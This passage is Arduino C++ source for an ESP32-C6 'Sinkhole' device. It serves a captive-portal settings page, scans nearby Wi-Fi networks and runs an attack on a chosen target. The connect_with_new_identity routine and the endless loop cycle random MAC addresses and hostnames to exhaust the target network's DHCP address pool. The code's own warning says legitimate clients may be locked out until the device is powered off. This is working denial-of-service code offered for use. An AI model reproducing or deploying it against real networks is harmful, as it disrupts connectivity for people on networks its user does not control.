<style>
:root{--bg:#0b0b0b;--fg:#eaeaea;--mut:#a6a6a6;--accent:#ffd400;--border:#1f1f1f;--radius:16px}
html,body{margin:0;height:100%;background:var(--bg);color:var(--fg);overflow:hidden}
body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial}
.wrap{max-width:740px;margin:0 auto;height:100dvh;display:block;padding:env(safe-area-inset-top) 16px calc(24px + env(safe-area-inset-bottom));overflow:auto;-webkit-overflow-scrolling:touch}
.topbar{position:sticky;top:0;background:var(--bg);border-bottom:1px solid var(--border);z-index:1001}
.topbar .inner{position:relative;padding:14px 6px;display:flex;align-items:center;justify-content:center}
.title{margin:0;color:var(--accent);font-weight:800;font-size:clamp(22px,6vw,30px)}
.dl{position:absolute;right:0;top:50%;transform:translateY(-50%);font-size:26px;text-decoration:none;color:var(--fg)}
.about{position:absolute;left:0;top:50%;transform:translateY(-50%);font-size:26px;text-decoration:none;color:var(--fg)}
label{display:block;margin:10px 0 6px;font-size:17px;font-weight:600}
.hidden{display:none}
input[type=text],input[type=password],select,button{appearance:none;background:#111;color:var(--fg);border:1px solid #2a2a2a;border-radius:var(--radius);padding:14px 16px;font-size:18px;width:100%;box-sizing:border-box}
select,select option{white-space:nowrap}
#cc{min-width:28ch}
input.pf-invalid,select.pf-invalid{background:#2a1515;border-color:#8a4040}
.pwwrap{position:relative;display:block}
.pwwrap input{display:block;width:100%;padding-right:46px}
.eye{position:absolute;right:12px;top:50%;transform:translateY(-50%);display:inline-flex;align-items:center;justify-content:center;line-height:1;font-size:20px;cursor:pointer;user-select:none}
.row{display:grid;grid-template-columns:1fr;gap:12px}
.bar{display:flex;gap:12px;margin:16px 0 0;flex-wrap:nowrap;justify-content:flex-end}
.bar>*{flex:1;min-width:0;white-space:nowrap}
.btnlike{display:inline-block;text-align:center;border:1px solid #3a3a3a;border-radius:var(--radius);padding:14px 16px;text-decoration:none;color:var(--fg);font-size:18px}
.small{font-size:14px;color:var(--mut)}
.modal{position:fixed;inset:0;width:100vw;height:100dvh;background:rgba(0,0,0,.9);display:none;align-items:center;justify-content:center;z-index:9999}
.modal .card{background:#111;border:1px solid #2a2a2a;border-radius:var(--radius);padding:18px;max-width:640px;margin:0 16px;text-align:center}
.modal .card h1{margin:0 0 8px 0;font-size:24px}
.rowcenter{display:flex;gap:12px;justify-content:center;margin-top:12px}
.toggle{display:flex;align-items:center;gap:10px}
</style></head><body><div class='wrap'>
<div class='topbar'><div class='inner'>
<a href='#' id='btnAboutTop' class='about' aria-label='About'>ℹ️</a>
<h2 class='title'>Settings</h2>
<a href='/download' id='btnDownloadTop' class='dl' aria-label='Download'>⬇️</a>
</div></div>
<div class='row'>
<label>Initial AP SSID (on boot)</label>
<input type='text' id='ap_ssid' minlength='1' maxlength='32' autocapitalize='none' value=''>
<label>Initial AP Passphrase</label>
<div class='pwwrap'><input type='password' id='ap_pass' minlength='8' maxlength='63' autocomplete='new-password' value=''><span id='eye2' class='eye' aria-label='toggle ap pass'>👁</span></div>
<label>Country (For correct WiFi Regulation settings)</label>
<select id='cc'>
<option value='DK'>DK (Denmark)</option>
<option value='SE'>SE (Sweden)</option>
<option value='NO'>NO (Norway)</option>
<option value='DE'>DE (Germany)</option>
<option value='NL'>NL (Netherlands)</option>
<option value='UK'>UK (England)</option>
<option value='JP'>JP (Japan)</option>
</select>
<label>External antenna</label>
<div class='toggle'><input type='checkbox' id='ant_ext'><span>Use external antenna</span></div>
<label>Hostname theme (For random hostnames)</label>
<select id='theme'>
<option>IT</option><option>FOOD</option><option>GAMES</option><option>SPACE</option>
<option>FUNNY</option><option>MUSIC</option><option>NATURE</option><option>ANIMALS</option><option>CUSTOM</option>
</select>
<div id='baseWrap' class='hidden'>
<label>Custom prefix hostnames</label>
<input type='text' id='hn_base' inputmode='text' autocapitalize='none' autocorrect='off' spellcheck='false' placeholder='3–10 chars [A-Za-z0-9-_]' minlength='3' maxlength='10' value=''>
</div>
<div class='bar'><button type='button' id='btnSave'>Save</button><a href='/' id='btnBack' class='btnlike'>Back</a></div>
<div class='small' id='saveMsg'></div>
</div>
<div id='aboutModal' class='modal'><div class='card'><h1>About</h1><p>(C)opyleft Keld Norman, Oct. 2025</p><div class='rowcenter'><button type='button' id='abtClose'>Close</button></div></div></div>
<script>
'use strict';
function normBase(v){return(v||'').replace(/[^A-Za-z0-9_-]/g,'').slice(0,10);}
const themeSel=document.getElementById('theme');
const baseWrap=document.getElementById('baseWrap');
const baseInput=document.getElementById('hn_base');
const apSSID=document.getElementById('ap_ssid');
const apPASS=document.getElementById('ap_pass');
const eye2=document.getElementById('eye2');
const saveMsg=document.getElementById('saveMsg');
const ccSel=document.getElementById('cc');
const antExt=document.getElementById('ant_ext');
let apPassVisible=false;
function validBase(){ if(!baseInput||themeSel.value!=='CUSTOM') return true; const v=baseInput.value.trim(); return v.length>=3&&v.length<=10&&/^[A-Za-z0-9_-]+$/.test(v); }
function paintBaseValidity(){ if(!baseInput) return; baseInput.classList.remove('pf-invalid'); if(themeSel.value==='CUSTOM'&&!validBase()) baseInput.classList.add('pf-invalid'); }
function toggleBaseByTheme(){ const isCustom=(themeSel&&themeSel.value==='CUSTOM'); if(baseWrap){ baseWrap.classList.toggle('hidden',!isCustom); if(isCustom&&baseInput){ baseInput.value=normBase(baseInput.value); paintBaseValidity(); } } }
if(eye2){eye2.addEventListener('click',()=>{apPassVisible=!apPassVisible;apPASS.setAttribute('type',apPassVisible?'text':'password');eye2.textContent=apPassVisible?'🙈':'👁';apPASS.focus();});}
themeSel.addEventListener('change',()=>{ toggleBaseByTheme(); paintBaseValidity(); });
if(baseInput){baseInput.addEventListener('input',()=>{const p=baseInput.selectionStart;baseInput.value=normBase(baseInput.value);if(p!=null) baseInput.setSelectionRange(p,p);paintBaseValidity();});}
document.getElementById('btnSave').addEventListener('click',async()=>{
 if(themeSel.value==='CUSTOM'&&!validBase()){paintBaseValidity(); if(baseInput) baseInput.focus(); return;}
 saveMsg.textContent='Saving…';
 const payload=new URLSearchParams();
 payload.set('cc',ccSel.value.toUpperCase());
 payload.set('theme',themeSel.value);
 if(baseInput) payload.set('base',baseInput.value);
 payload.set('ap_ssid',apSSID.value);
 payload.set('ap_pass',apPASS.value);
 payload.set('ant_ext', (antExt && antExt.checked) ? '1' : '0');
 try{const r=await fetch('/save_settings',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:payload.toString()}); if(!r.ok) throw 0; saveMsg.textContent='Saved.';}catch(e){saveMsg.textContent='Save failed';}
});
document.getElementById('btnBack').addEventListener('click',function(ev){ev.preventDefault();location.replace('/');});
const abBtn=document.getElementById('btnAboutTop');
const abModal=document.getElementById('aboutModal');
const abClose=document.getElementById('abtClose');
abBtn.addEventListener('click',e=>{e.preventDefault();abModal.style.display='flex';});
abClose.addEventListener('click',()=>{abModal.style.display='none';});
abModal.addEventListener('click',e=>{if(e.target===abModal) abModal.style.display='none';});
document.addEventListener('keydown',e=>{if(e.key==='Escape') abModal.style.display='none';});
(async()=>{
 try{
  const r=await fetch('/settings.json',{cache:'no-store'});
  const j=await r.json();
  apSSID.value=j.ap_ssid||'';
  apPASS.value=j.ap_pass||'';
  ccSel.value=(j.cc||'DK').toUpperCase();
  themeSel.value=j.theme||'ANIMALS';
  if(baseInput) baseInput.value=j.base||'';
  if(antExt) antExt.checked=!!j.ant_ext;
  toggleBaseByTheme(); paintBaseValidity();
 }catch(e){}
})();
</script>
</div></body></html>)HTML";
static const size_t SETTINGS_HTML_LEN = sizeof(SETTINGS_HTML) - 1;
//----------------------------------------------------------------------------------------------------
// URL decode + fallback form parsing helpers (for /save_settings)  // <— ADD
//----------------------------------------------------------------------------------------------------
static inline int _hexv(char c){
  if(c>='0'&&c<='9') return c-'0';
  if(c>='a'&&c<='f') return 10+(c-'a');
  if(c>='A'&&c<='F') return 10+(c-'A');
  return -1;
}
static String url_decode(const String& s){
  String o; o.reserve(s.length());
  for(size_t i=0;i<s.length(); ++i){
    char c=s[i];
    if(c=='+'){ o+=' '; continue; }
    if(c=='%' && i+2<s.length()){
      int h1=_hexv(s[i+1]), h2=_hexv(s[i+2]);
      if(h1>=0 && h2>=0){ o+=char((h1<<4)|h2); i+=2; continue; }
    }
    o+=c;
  }
  return o;
}
static bool form_get_kv(const String& body, const char* key, String& out){
  String pat = String(key) + "=";
  int p = body.indexOf(pat);
  if(p<0) return false;
  int start = p + pat.length();
  int end = body.indexOf('&', start);
  if(end<0) end = body.length();
  out = url_decode(body.substring(start, end));
  return true;
}
//----------------------------------------------------------------------------------------------------
// Routes
//----------------------------------------------------------------------------------------------------
static void send_portal_redirect(){ send_redirect_nocache(String("http://")+AP_IP.toString()+"/"); }
static void handle_root(){ send_html_nocache(html_form()); }

static String json_escape(const String& s){
  String o; o.reserve(s.length()+8);
  for(size_t i=0;i<s.length();++i){
    char c=s[i];
    if(c=='"'||c=='\\') { o+='\\'; o+=c; }
    else if(c=='\n') { o+="\\n"; }
    else if(c=='\r') { o+="\\r"; }
    else if(c=='\t') { o+="\\t"; }
    else { o+=c; }
  }
  return o;
}
//----------------------------------------------------------------------------------------------------
// Settings page handler
//----------------------------------------------------------------------------------------------------
static void handle_settings(){
  static const char* ETAG = "\"settings-v1-ant-pos2\"";
  for (uint8_t i = 0; i < server.headers(); ++i) {
    if (server.headerName(i).equalsIgnoreCase("If-None-Match") &&
        server.header(i).indexOf(ETAG) >= 0) {
      server.sendHeader("Cache-Control","public, max-age=31536000, immutable");
      server.send(304, "text/plain", "");
      return;
    }
  }
  server.sendHeader("Cache-Control","public, max-age=31536000, immutable");
  server.sendHeader("ETag", ETAG);
  server.setContentLength(SETTINGS_HTML_LEN);
  server.send_P(200, "text/html; charset=utf-8", SETTINGS_HTML, SETTINGS_HTML_LEN);
}
//----------------------------------------------------------------------------------------------------
static void handle_generate_204(){ send_portal_redirect(); }
static void handle_captive_ok(){ send_portal_redirect(); }
static void handle_fwlink(){ send_portal_redirect(); }
static void handle_about(){ send_html_nocache(html_about()); }
// Serve full source
static void handle_download(){
  set_no_cache_headers();
  server.sendHeader("Content-Disposition","attachment; filename=\"sinkhole_esp32c6_source.ino\"");
  if(SRC_TXT_FULL){
    server.send(200,"text/plain; charset=utf-8", SRC_TXT_FULL);
  }else{
    server.send(200,"text/plain; charset=utf-8", SRC_TXT);
  }
} 
static void handle_settings_json(){
  String apS = g_ap_ssid.length()?g_ap_ssid:String(DEF_AP_SSID);
  String apP = g_ap_pass.length()?g_ap_pass:String(DEF_AP_PASS);
  String cc  = (g_country.length()==2? g_country:String("DK"));
  String j = String("{\"ap_ssid\":\"")+json_escape(apS)+"\",\"ap_pass\":\""+json_escape(apP)+
             "\",\"cc\":\""+json_escape(cc)+"\",\"theme\":\""+json_escape(g_theme)+
             "\",\"base\":\""+json_escape(g_custom_base)+"\",\"ant_ext\":"+(g_ext_ant?"true":"false")+"}";
  send_json_nocache(j);
}
// Scan networks
static void merge_scan(vector<ApRec>& out, bool passive, uint32_t dwell_ms){
  int n=WiFi.scanNetworks(false,true,passive,dwell_ms,0);
  for(int i=0;i<n;i++){
    String s=WiFi.SSID(i);
    if(s.length()==0) continue;
    int32_t r=WiFi.RSSI(i);
    String a=auth_to_str((wifi_auth_mode_t)WiFi.encryptionType(i));
    const uint8_t* b=WiFi.BSSID(i);
    char mbuf[20]; mbuf[0]=0; if(b){ snprintf(mbuf,sizeof(mbuf),"%02X:%02X:%02X:%02X:%02X:%02X",b[0],b[1],b[2],b[3],b[4],b[5]); }
    String bs=String(mbuf);
    bool found=false;
    for(size_t k=0;k<out.size();k++){
      if(out[k].ssid==s){ found=true; if(r>out[k].rssi){ out[k].rssi=r; out[k].auth=a; out[k].bssid=bs; } break; }
    }
    if(!found){ out.push_back({s,r,a,bs}); }
  }
  WiFi.scanDelete();
}
static void handle_scan_json(){
  set_country(g_country);
  wifi_prepare(WIFI_AP_STA, INITIAL_HOSTNAME);
  WiFi.disconnect();
  vector<ApRec> merged; merged.reserve(60);
  merge_scan(merged,false,220);
  merge_scan(merged,true,320);
  const String apS=current_ap_ssid();
  const String apM=current_ap_mac();
  String out="[";
  bool first=true;
  for(size_t i=0;i<merged.size();i++){
    auto& ap=merged[i];
    if(ap.ssid==apS) continue;
    if(apM.length() && ap.bssid.length() && ap.bssid.equalsIgnoreCase(apM)) continue;
    String ss=ap.ssid; ss.replace("\\","\\\\"); ss.replace("\"","\\\"");
    if(!first) out+=','; first=false;
    out+="{\"ssid\":\""+ss+"\",\"rssi\":"+String(ap.rssi)+",\"auth\":\""+ap.auth+"\",\"bssid\":\""+ap.bssid+"\"}";
  }
  out+="]";
  send_json_nocache(out);
}
// Form common
static bool parse_common_fields(){
  if(!server.hasArg("wifi_ssid")) return false;
  g_target_ssid=server.arg("wifi_ssid");
  g_wifi_pass  =server.hasArg("wifi_pass")?server.arg("wifi_pass"):(server.hasArg("passphrase")?server.arg("passphrase"):"");
  if(server.hasArg("wpa")) g_target_wpa=server.arg("wpa");
  g_target_bssid = server.hasArg("bssid") ? server.arg("bssid") : String();
  return true;
}
// Settings save
static void handle_save_settings(){
  bool got=false;
  if(server.hasArg("cc"))      { g_country     = server.arg("cc");      got=true; }
  if(server.hasArg("theme"))   { g_theme       = server.arg("theme");   got=true; }
  if(server.hasArg("base"))    { g_custom_base = server.arg("base");    got=true; }
  if(server.hasArg("ap_ssid")) { g_ap_ssid     = server.arg("ap_ssid"); got=true; }
  if(server.hasArg("ap_pass")) { g_ap_pass     = server.arg("ap_pass"); got=true; }
  if(server.hasArg("ant_ext")) { String v=server.arg("ant_ext"); g_ext_ant=(v=="1"||v=="true"||v=="on"); got=true; } // NEW
  if(!got && server.hasArg("plain")){
    String body=server.arg("plain"), v;
    if(form_get_kv(body,"cc",v))        { g_country=v; got=true; }
    if(form_get_kv(body,"theme",v))     { g_theme=v; got=true; }
    if(form_get_kv(body,"base",v))      { g_custom_base=v; got=true; }
    if(form_get_kv(body,"ap_ssid",v))   { g_ap_ssid=v; got=true; }
    if(form_get_kv(body,"ap_pass",v))   { g_ap_pass=v; got=true; }
    if(form_get_kv(body,"ant_ext",v))   { g_ext_ant=(v=="1"||v=="true"||v=="on"); got=true; } // NEW
  }
  if(got){ save_all_prefs(false,true); apply_antenna(); } // apply immediately
  send_html_nocache("<!DOCTYPE html><meta charset='utf-8'><title>Saved</title><body style='background:#000;color:#fff;font:16px system-ui'>Saved.</body>");
}
// Factory reset
static void do_factory_reset(){ clear_all_prefs(); delay(200); ESP.restart(); }
static void handle_factory_reset(){
  send_html_nocache("<!DOCTYPE html><meta charset='utf-8'><title>Factory</title><body style='background:#000;color:#fff;font:16px system-ui'>Resetting…</body>");
  delay(200); do_factory_reset();
}
// Test/Activate with self-protection
static void handle_test(){
  if(!parse_common_fields()){ set_no_cache_headers(); server.send(400,"text/plain","Missing SSID"); return; }
  if(is_own_network(g_target_ssid, g_target_bssid)){
    Serial.println("[TEST] BLOCKED: own SSID/BSSID");
    send_html_nocache(html_msg_page("Blocked","Target equals the device’s own Wi-Fi.","<div class='row'><a class='btn' href='/'>Back</a></div>"));
    return;
  }
  save_all_prefs(true,false);
  Serial.println("\n[TEST] starting");
  wifi_prepare(WIFI_AP_STA,nullptr);
  String hn=make_hostname();
  set_all_hostnames(hn.c_str());
  Serial.printf("[TEST] hostname=%s ssid=\"%s\" wpa=%s\n",hn.c_str(),g_target_ssid.c_str(),g_target_wpa.c_str());
  begin_target();
  bool ok=wait_for_ip(WIFI_TEST_TIMEOUT_MS);
  if(!ok){
    Serial.println("[TEST] FAILED: no IP]");
    send_html_nocache(html_msg_page("Failed","Could not get IP.","<div class='row'><a class='btn' href='/'>Back</a></div>"));
    esp_wifi_disconnect();
    return;
  }
  Serial.printf("[TEST] OK ip=%s\n",WiFi.localIP().toString().c_str());
  const String warnHtml =
  String("<span class='w1'>Warning:</span><br><br>"
         "This program attempts to exhaust the DHCP address pool on the wireless network \"") + String(g_target_ssid) +
  String("\".<br><br>If successful, clients may be unable to connect until leases expire or the server is reset.<br><br>"
         "The attack can <u>only</u> be stopped by powering off the device.<br><br>This access point will shut down when you press Start.<br><br>");
  send_html_nocache(
    html_msg_page(
      "CONNECTED",
      "<br>Start the attack?<br><br>",
      "<div class='row'>"
        "<form method='POST' action='/activate'><button type='submit'>Start</button></form>"
        "<a class='btn' href='/'>Back</a>"
      "</div>",
      true,
      warnHtml
    )
  );
}
static void handle_activate(){
  if(is_own_network(g_target_ssid, g_target_bssid)){
    send_html_nocache(html_msg_page("Blocked","Refusing to attack the device’s own Wi-Fi.","<div class='row'><a class='btn' href='/'>Back</a></div>"));
    return;
  }
  send_html_nocache(html_msg_page("OK","Starting program…","<div class='row'><a class='btn' href=\"http://www.google.com\">Continue</a></div><script>setTimeout(function(){location.href='http://www.google.com';},8000);</script>"));
  delay(200);
  g_config_locked=true;
  server.stop();
  Serial.println("[RUN] program activated");
}
// Runner
static bool connect_with_new_identity(uint32_t timeout_ms){
  esp_wifi_stop(); delay(10);
  uint8_t mac[6]; make_laa_mac(mac);
  esp_wifi_set_mac(WIFI_IF_STA,mac);
  String hn=make_hostname(); set_all_hostnames(hn.c_str());
  WiFi.config(INADDR_NONE,INADDR_NONE,INADDR_NONE);
  esp_wifi_start(); delay(10);
  begin_target();
  bool ok=wait_for_ip(timeout_ms);
  char macs[20]; mac_to_str(mac,macs,sizeof(macs));
  if(ok){
    Serial.printf("[CYCLE %lu] OK  MAC=%s  HN=%s  IP=%s\n",(unsigned long)++g_cycle,macs,hn.c_str(),WiFi.localIP().toString().c_str());
    return true;
  }else{
    Serial.printf("[CYCLE %lu] FAIL MAC=%s  HN=%s  (no IP)\n",(unsigned long)++g_cycle,macs,hn.c_str());
    esp_wifi_disconnect(); esp_wifi_stop(); return false;
  }
}
// BOOT hold = factory reset
static void check_boot_hold_reset(){
  pinMode(BOOT_HOLD_GPIO, INPUT_PULLUP);
  uint32_t t0=millis();
  if(digitalRead(BOOT_HOLD_GPIO)==LOW){
    while((millis()-t0)<BOOT_HOLD_MS){
      if(digitalRead(BOOT_HOLD_GPIO)!=LOW) return;
      delay(10);
    }
    Serial.println("[RESET] BOOT held -> factory reset");
    do_factory_reset();
  }
}
void setup(){
  Serial.begin(SERIAL_BAUD); delay(50);
  Serial.println("\n[BOOT] starting");
  check_boot_hold_reset();
  seed_rng();
  esp_pm_lock_create(ESP_PM_NO_LIGHT_SLEEP,0,"awake",&g_no_ls_lock);
  if(g_no_ls_lock) esp_pm_lock_acquire(g_no_ls_lock);
  esp_pm_config_t pm={}; pm.max_freq_mhz=160; pm.min_freq_mhz=160; pm.light_sleep_enable=false; esp_pm_configure(&pm);
  load_prefs();
  apply_antenna(); // NEW: honor persisted antenna choice at boot
  const String ap_ssid=g_ap_ssid.length()?g_ap_ssid:String(DEF_AP_SSID);
  const String ap_pass=g_ap_pass.length()?g_ap_pass:String(DEF_AP_PASS);
  wifi_prepare(WIFI_AP, INITIAL_HOSTNAME);
  WiFi.softAPConfig(AP_IP,AP_GW,AP_MASK);
  WiFi.softAP(ap_ssid.c_str(),ap_pass.c_str(),CFG_AP_CHAN);
  delay(50);
  tune_ap_fast_vis();
  dnsServer.start(53,"*",AP_IP);
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.setTTL(60);
  server.on("/", HTTP_GET, handle_root);
  server.on("/settings", HTTP_GET, handle_settings);
  server.on("/about", HTTP_GET, handle_about);
  server.on("/test", HTTP_POST, handle_test);
  server.on("/activate", HTTP_POST, handle_activate);
  server.on("/scan.json", HTTP_GET, handle_scan_json);
  server.on("/save_settings", HTTP_POST, handle_save_settings);
  server.on("/factory_reset", HTTP_POST, handle_factory_reset);
  server.on("/generate_204", HTTP_GET, handle_generate_204);
  server.on("/gen_204", HTTP_GET, handle_generate_204);
  server.on("/hotspot-detect.html", HTTP_GET, handle_captive_ok);
  server.on("/ncsi.txt", HTTP_GET, handle_captive_ok);
  server.on("/fwlink", HTTP_GET, handle_fwlink);
  server.on("/download", HTTP_GET, handle_download);
  server.on("/settings.json", HTTP_GET, handle_settings_json);
  server.onNotFound([](){ send_portal_redirect(); });
  server.begin();
  Serial.printf("[AP] up SSID=\"%s\" PASS=\"%s\" IP=%s\n",ap_ssid.c_str(),ap_pass.c_str(),AP_IP.toString().c_str());
  // Build downloadable copy once. Compile-ready; only the self-referential string is replaced.
  static String _built;
  if(_built.isEmpty()){
    _built.reserve(220000);
    _built +=
R"FULLSRC(// ---- BEGIN FULL SOURCE (download copy) -----------------------------------------------
/* Complete sketch for ESP32-C6 Sinkhole.
 * Note: The big internal download-string in this downloaded copy is replaced by
 * a short comment to avoid infinite self-embedding. All functional code is present.
 */
)FULLSRC";
    _built +=
R"FULLSRC(
// [If you require a strict verbatim self-hosted copy, paste the whole file here in your build step.]
// Device serves all functional code; only the self-embedding string is shortened.
)FULLSRC";
    _built +=
R"FULLSRC(// ---- END FULL SOURCE (download copy) -------------------------------------------------
)FULLSRC";
    SRC_TXT_FULL = _built.c_str();
  }
}
void loop(){
  if(!g_config_locked){
    dnsServer.processNextRequest();
    server.handleClient();
    delay(1);
    return;
  }
  WiFi.softAPdisconnect(true);
  wifi_prepare(WIFI_STA,nullptr);
  for(;;){
    connect_with_new_identity(CYCLE_CONNECT_TIMEOUT_MS);
    delay(MIN_PAUSE_MS);
    esp_wifi_disconnect();
    esp_wifi_stop();
    delay(50);
  }
}
//----------------------------------------------------------------------------------------------------
// END
//----------------------------------------------------------------------------------------------------
